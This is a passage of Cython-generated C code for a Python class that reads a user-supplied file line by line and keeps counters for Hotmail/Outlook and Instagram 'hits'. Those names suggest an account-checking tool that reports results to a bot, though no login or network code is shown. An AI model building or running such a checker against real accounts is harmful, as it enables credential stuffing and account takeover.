          __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
          goto __pyx_L8_exception_handled;
        }
        __pyx_L9_except_error:;
        __Pyx_XGIVEREF(__pyx_t_6);
        __Pyx_XGIVEREF(__pyx_t_7);
        __Pyx_XGIVEREF(__pyx_t_8);
        __Pyx_ExceptionReset(__pyx_t_6, __pyx_t_7, __pyx_t_8);
        goto __pyx_L1_error;
        __pyx_L8_exception_handled:;
        __Pyx_XGIVEREF(__pyx_t_6);
        __Pyx_XGIVEREF(__pyx_t_7);
        __Pyx_XGIVEREF(__pyx_t_8);
        __Pyx_ExceptionReset(__pyx_t_6, __pyx_t_7, __pyx_t_8);
        __pyx_L12_try_end:;
      }
    }
    /*finally:*/ {
      /*normal exit:*/{
        if (__pyx_t_4) {
          __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_tuple_, NULL);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 357, __pyx_L1_error)
          __Pyx_GOTREF(__pyx_t_8);
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        }
        goto __pyx_L6;
      }
      __pyx_L6:;
    }
    goto __pyx_L16;
    __pyx_L3_error:;
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    goto __pyx_L1_error;
    __pyx_L16:;
  }

  

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_AddTraceback("source.sg", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_3com_1red(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
static PyMethodDef __pyx_mdef_6source_3com_1red = {"red", (PyCFunction)__pyx_pw_6source_3com_1red, METH_NOARGS, 0};
static PyObject *__pyx_pw_6source_3com_1red(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("red (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_3com_red(__pyx_self);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_3com_red(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("red", 0);

  
  __Pyx_XDECREF(__pyx_r);
  __Pyx_INCREF(__pyx_kp_u_1_31m);
  __pyx_r = __pyx_kp_u_1_31m;
  goto __pyx_L0;

  

  /* function exit code */
  __pyx_L0:;
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_3com_3grn(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
static PyMethodDef __pyx_mdef_6source_3com_3grn = {"grn", (PyCFunction)__pyx_pw_6source_3com_3grn, METH_NOARGS, 0};
static PyObject *__pyx_pw_6source_3com_3grn(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("grn (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_3com_2grn(__pyx_self);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_3com_2grn(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("grn", 0);

  
  __Pyx_XDECREF(__pyx_r);
  __Pyx_INCREF(__pyx_kp_u_1_32m);
  __pyx_r = __pyx_kp_u_1_32m;
  goto __pyx_L0;

  

  /* function exit code */
  __pyx_L0:;
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_3com_5yalo(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
static PyMethodDef __pyx_mdef_6source_3com_5yalo = {"yalo", (PyCFunction)__pyx_pw_6source_3com_5yalo, METH_NOARGS, 0};
static PyObject *__pyx_pw_6source_3com_5yalo(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("yalo (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_3com_4yalo(__pyx_self);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_3com_4yalo(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("yalo", 0);

  
  __Pyx_XDECREF(__pyx_r);
  __Pyx_INCREF(__pyx_kp_u_1_33m);
  __pyx_r = __pyx_kp_u_1_33m;
  goto __pyx_L0;

  

  /* function exit code */
  __pyx_L0:;
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_3com_7blo(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
static PyMethodDef __pyx_mdef_6source_3com_7blo = {"blo", (PyCFunction)__pyx_pw_6source_3com_7blo, METH_NOARGS, 0};
static PyObject *__pyx_pw_6source_3com_7blo(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("blo (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_3com_6blo(__pyx_self);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_3com_6blo(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("blo", 0);

  
  __Pyx_XDECREF(__pyx_r);
  __Pyx_INCREF(__pyx_kp_u_1_36m);
  __pyx_r = __pyx_kp_u_1_36m;
  goto __pyx_L0;

  

  /* function exit code */
  __pyx_L0:;
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_3com_9orde(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
static PyMethodDef __pyx_mdef_6source_3com_9orde = {"orde", (PyCFunction)__pyx_pw_6source_3com_9orde, METH_NOARGS, 0};
static PyObject *__pyx_pw_6source_3com_9orde(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("orde (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_3com_8orde(__pyx_self);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_3com_8orde(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("orde", 0);

  
  __Pyx_XDECREF(__pyx_r);
  __Pyx_INCREF(__pyx_kp_u_1_35m);
  __pyx_r = __pyx_kp_u_1_35m;
  goto __pyx_L0;

  

  /* function exit code */
  __pyx_L0:;
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_3com_11blodk(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
static PyMethodDef __pyx_mdef_6source_3com_11blodk = {"blodk", (PyCFunction)__pyx_pw_6source_3com_11blodk, METH_NOARGS, 0};
static PyObject *__pyx_pw_6source_3com_11blodk(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("blodk (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_3com_10blodk(__pyx_self);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_3com_10blodk(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("blodk", 0);

  
  __Pyx_XDECREF(__pyx_r);
  __Pyx_INCREF(__pyx_kp_u_1_34m);
  __pyx_r = __pyx_kp_u_1_34m;
  goto __pyx_L0;

  

  /* function exit code */
  __pyx_L0:;
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_3com_13A(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
static PyMethodDef __pyx_mdef_6source_3com_13A = {"A", (PyCFunction)__pyx_pw_6source_3com_13A, METH_NOARGS, 0};
static PyObject *__pyx_pw_6source_3com_13A(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("A (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_3com_12A(__pyx_self);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_3com_12A(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("A", 0);

  
  __Pyx_XDECREF(__pyx_r);
  __Pyx_INCREF(__pyx_kp_u_2_39_40m);
  __pyx_r = __pyx_kp_u_2_39_40m;
  goto __pyx_L0;

  

  /* function exit code */
  __pyx_L0:;
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_3com_15brt(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
static PyMethodDef __pyx_mdef_6source_3com_15brt = {"brt", (PyCFunction)__pyx_pw_6source_3com_15brt, METH_NOARGS, 0};
static PyObject *__pyx_pw_6source_3com_15brt(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("brt (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_3com_14brt(__pyx_self);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_3com_14brt(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("brt", 0);

  
  __Pyx_XDECREF(__pyx_r);
  __Pyx_INCREF(__pyx_kp_u_38_2_255_165_0m);
  __pyx_r = __pyx_kp_u_38_2_255_165_0m;
  goto __pyx_L0;

  

  /* function exit code */
  __pyx_L0:;
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_5Sajad_1__init__(PyObject *__pyx_self, PyObject *__pyx_v_self); /*proto*/
static PyMethodDef __pyx_mdef_6source_5Sajad_1__init__ = {"__init__", (PyCFunction)__pyx_pw_6source_5Sajad_1__init__, METH_O, 0};
static PyObject *__pyx_pw_6source_5Sajad_1__init__(PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__init__ (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_5Sajad___init__(__pyx_self, ((PyObject *)__pyx_v_self));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_5Sajad___init__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("__init__", 0);

  
  if (__Pyx_PyObject_SetAttrStr(__pyx_v_self, __pyx_n_s_namefile, __pyx_kp_u_Dosya_Adn_Giriniz) < 0) __PYX_ERR(0, 390, __pyx_L1_error)

  
  if (__Pyx_PyObject_SetAttrStr(__pyx_v_self, __pyx_n_s_loob, __pyx_int_0) < 0) __PYX_ERR(0, 391, __pyx_L1_error)

  
  if (__Pyx_PyObject_SetAttrStr(__pyx_v_self, __pyx_n_s_badighot, __pyx_int_0) < 0) __PYX_ERR(0, 393, __pyx_L1_error)

  
  if (__Pyx_PyObject_SetAttrStr(__pyx_v_self, __pyx_n_s_badigout, __pyx_int_0) < 0) __PYX_ERR(0, 394, __pyx_L1_error)

  
  if (__Pyx_PyObject_SetAttrStr(__pyx_v_self, __pyx_n_s_okhot, __pyx_int_0) < 0) __PYX_ERR(0, 395, __pyx_L1_error)

  
  if (__Pyx_PyObject_SetAttrStr(__pyx_v_self, __pyx_n_s_okout, __pyx_int_0) < 0) __PYX_ERR(0, 396, __pyx_L1_error)

  
  if (__Pyx_PyObject_SetAttrStr(__pyx_v_self, __pyx_n_s_badhot, __pyx_int_0) < 0) __PYX_ERR(0, 397, __pyx_L1_error)

  
  if (__Pyx_PyObject_SetAttrStr(__pyx_v_self, __pyx_n_s_badout, __pyx_int_0) < 0) __PYX_ERR(0, 398, __pyx_L1_error)

  
  if (__Pyx_PyObject_SetAttrStr(__pyx_v_self, __pyx_n_s_goodhotandout, __pyx_n_u_Hit) < 0) __PYX_ERR(0, 399, __pyx_L1_error)

  
  if (__Pyx_PyObject_SetAttrStr(__pyx_v_self, __pyx_n_s_badmain, __pyx_kp_u_Kt_mail) < 0) __PYX_ERR(0, 400, __pyx_L1_error)

  
  if (__Pyx_PyObject_SetAttrStr(__pyx_v_self, __pyx_n_s_badinsta, __pyx_kp_u_Kt_insta) < 0) __PYX_ERR(0, 401, __pyx_L1_error)

  
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_tokenbot); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 402, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_3)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_3);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
    }
  }
  __pyx_t_1 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 402, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_AddTraceback("source.Sajad.__init__", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_5Sajad_3chkfile(PyObject *__pyx_self, PyObject *__pyx_v_self); /*proto*/
static PyMethodDef __pyx_mdef_6source_5Sajad_3chkfile = {"chkfile", (PyCFunction)__pyx_pw_6source_5Sajad_3chkfile, METH_O, 0};
static PyObject *__pyx_pw_6source_5Sajad_3chkfile(PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("chkfile (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_5Sajad_2chkfile(__pyx_self, ((PyObject *)__pyx_v_self));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_5Sajad_2chkfile(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_v_filename = NULL;
  PyObject *__pyx_v_user_file = NULL;
  PyObject *__pyx_v_lines = NULL;
  PyObject *__pyx_v_executor = NULL;
  PyObject *__pyx_v_use = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  PyObject *__pyx_t_8 = NULL;
  PyObject *__pyx_t_9 = NULL;
  PyObject *__pyx_t_10 = NULL;
  PyObject *__pyx_t_11 = NULL;
  Py_ssize_t __pyx_t_12;
  PyObject *__pyx_t_13 = NULL;
  int __pyx_t_14;
  int __pyx_t_15;
  int __pyx_t_16;
  PyObject *__pyx_t_17 = NULL;
  PyObject *(*__pyx_t_18)(PyObject *);
  PyObject *__pyx_t_19 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("chkfile", 0);

  
  while (1) {

    
    __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_namefile); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 406, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_2 = __Pyx_PyObject_CallOneArg(__pyx_builtin_input, __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 406, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF_SET(__pyx_v_filename, __pyx_t_2);
    __pyx_t_2 = 0;

    
    {
      __Pyx_PyThreadState_declare
      __Pyx_PyThreadState_assign
      __Pyx_ExceptionSave(&__pyx_t_3, &__pyx_t_4, &__pyx_t_5);
      __Pyx_XGOTREF(__pyx_t_3);
      __Pyx_XGOTREF(__pyx_t_4);
      __Pyx_XGOTREF(__pyx_t_5);
      /*try:*/ {

        
        /*with:*/ {
          __pyx_t_2 = PyTuple_New(2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 408, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_INCREF(__pyx_v_filename);
          __Pyx_GIVEREF(__pyx_v_filename);
          PyTuple_SET_ITEM(__pyx_t_2, 0, __pyx_v_filename);
          __Pyx_INCREF(__pyx_kp_u_r);
          __Pyx_GIVEREF(__pyx_kp_u_r);
          PyTuple_SET_ITEM(__pyx_t_2, 1, __pyx_kp_u_r);
          __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_t_2, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 408, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
          __pyx_t_6 = __Pyx_PyObject_LookupSpecial(__pyx_t_1, __pyx_n_s_exit); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 408, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_6);
          __pyx_t_7 = __Pyx_PyObject_LookupSpecial(__pyx_t_1, __pyx_n_s_enter); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 408, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_7);
          __pyx_t_8 = NULL;
          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_7))) {
            __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_7);
            if (likely(__pyx_t_8)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
              __Pyx_INCREF(__pyx_t_8);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_7, function);
            }
          }
          __pyx_t_2 = (__pyx_t_8) ? __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_t_8) : __Pyx_PyObject_CallNoArg(__pyx_t_7);
          __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
          if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 408, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          __pyx_t_7 = __pyx_t_2;
          __pyx_t_2 = 0;
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          /*try:*/ {
            {
              __Pyx_PyThreadState_declare
              __Pyx_PyThreadState_assign
              __Pyx_ExceptionSave(&__pyx_t_9, &__pyx_t_10, &__pyx_t_11);
              __Pyx_XGOTREF(__pyx_t_9);
              __Pyx_XGOTREF(__pyx_t_10);
              __Pyx_XGOTREF(__pyx_t_11);
              /*try:*/ {
                __Pyx_XDECREF_SET(__pyx_v_user_file, __pyx_t_7);
                __pyx_t_7 = 0;

                
                __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_user_file, __pyx_n_s_readlines); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 409, __pyx_L19_error)
                __Pyx_GOTREF(__pyx_t_1);
                __pyx_t_2 = NULL;
                if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_1))) {
                  __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_1);
                  if (likely(__pyx_t_2)) {
                    PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
                    __Pyx_INCREF(__pyx_t_2);
                    __Pyx_INCREF(function);
                    __Pyx_DECREF_SET(__pyx_t_1, function);
                  }
                }
                __pyx_t_7 = (__pyx_t_2) ? __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_2) : __Pyx_PyObject_CallNoArg(__pyx_t_1);
                __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
                if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 409, __pyx_L19_error)
                __Pyx_GOTREF(__pyx_t_7);
                __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                __Pyx_XDECREF_SET(__pyx_v_lines, __pyx_t_7);
                __pyx_t_7 = 0;

                
                __pyx_t_12 = PyObject_Length(__pyx_v_lines); if (unlikely(__pyx_t_12 == ((Py_ssize_t)-1))) __PYX_ERR(0, 410, __pyx_L19_error)
                __pyx_t_7 = PyInt_FromSsize_t(__pyx_t_12); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 410, __pyx_L19_error)
                __Pyx_GOTREF(__pyx_t_7);
                if (__Pyx_PyObject_SetAttrStr(__pyx_v_self, __pyx_n_s_nambrline, __pyx_t_7) < 0) __PYX_ERR(0, 410, __pyx_L19_error)
                __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

                
              }
              __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
              __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
              __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
              goto __pyx_L26_try_end;
              __pyx_L19_error:;
              __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
              __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
              __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
              __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
              /*except:*/ {
                __Pyx_AddTraceback("source.Sajad.chkfile", __pyx_clineno, __pyx_lineno, __pyx_filename);
                if (__Pyx_GetException(&__pyx_t_7, &__pyx_t_1, &__pyx_t_2) < 0) __PYX_ERR(0, 408, __pyx_L21_except_error)
                __Pyx_GOTREF(__pyx_t_7);
                __Pyx_GOTREF(__pyx_t_1);
                __Pyx_GOTREF(__pyx_t_2);
                __pyx_t_8 = PyTuple_Pack(3, __pyx_t_7, __pyx_t_1, __pyx_t_2); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 408, __pyx_L21_except_error)
                __Pyx_GOTREF(__pyx_t_8);
                __pyx_t_13 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_t_8, NULL);
                __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
                __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
                if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 408, __pyx_L21_except_error)
                __Pyx_GOTREF(__pyx_t_13);
                __pyx_t_14 = __Pyx_PyObject_IsTrue(__pyx_t_13);
                __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
                if (__pyx_t_14 < 0) __PYX_ERR(0, 408, __pyx_L21_except_error)
                __pyx_t_15 = ((!(__pyx_t_14 != 0)) != 0);
                if (__pyx_t_15) {
                  __Pyx_GIVEREF(__pyx_t_7);
                  __Pyx_GIVEREF(__pyx_t_1);
                  __Pyx_XGIVEREF(__pyx_t_2);
                  __Pyx_ErrRestoreWithState(__pyx_t_7, __pyx_t_1, __pyx_t_2);
                  __pyx_t_7 = 0; __pyx_t_1 = 0; __pyx_t_2 = 0; 
                  __PYX_ERR(0, 408, __pyx_L21_except_error)
                }
                __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
                __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
                __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
                goto __pyx_L20_exception_handled;
              }
              __pyx_L21_except_error:;
              __Pyx_XGIVEREF(__pyx_t_9);
              __Pyx_XGIVEREF(__pyx_t_10);
              __Pyx_XGIVEREF(__pyx_t_11);
              __Pyx_ExceptionReset(__pyx_t_9, __pyx_t_10, __pyx_t_11);
              goto __pyx_L5_error;
              __pyx_L20_exception_handled:;
              __Pyx_XGIVEREF(__pyx_t_9);
              __Pyx_XGIVEREF(__pyx_t_10);
              __Pyx_XGIVEREF(__pyx_t_11);
              __Pyx_ExceptionReset(__pyx_t_9, __pyx_t_10, __pyx_t_11);
              __pyx_L26_try_end:;
            }
          }
          /*finally:*/ {
            /*normal exit:*/{
              if (__pyx_t_6) {
                __pyx_t_11 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_tuple_, NULL);
                __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
                if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 408, __pyx_L5_error)
                __Pyx_GOTREF(__pyx_t_11);
                __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
              }
              goto __pyx_L18;
            }
            __pyx_L18:;
          }
          goto __pyx_L30;
          __pyx_L13_error:;
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          goto __pyx_L5_error;
          __pyx_L30:;
        }

        
        goto __pyx_L10_try_break;

        
      }
      __pyx_L5_error:;
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;

      
      __Pyx_ErrFetch(&__pyx_t_2, &__pyx_t_1, &__pyx_t_7);
      __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_FileNotFoundError); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 412, __pyx_L7_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __pyx_t_16 = __Pyx_PyErr_GivenExceptionMatches(__pyx_t_2, __pyx_t_8);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_ErrRestore(__pyx_t_2, __pyx_t_1, __pyx_t_7);
      __pyx_t_2 = 0; __pyx_t_1 = 0; __pyx_t_7 = 0;
      if (__pyx_t_16) {
        __Pyx_AddTraceback("source.Sajad.chkfile", __pyx_clineno, __pyx_lineno, __pyx_filename);
        if (__Pyx_GetException(&__pyx_t_7, &__pyx_t_1, &__pyx_t_2) < 0) __PYX_ERR(0, 412, __pyx_L7_except_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_GOTREF(__pyx_t_2);

        
        __pyx_t_8 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__2, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 413, __pyx_L7_except_error)
        __Pyx_GOTREF(__pyx_t_8);
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

        
        goto __pyx_L32_except_continue;
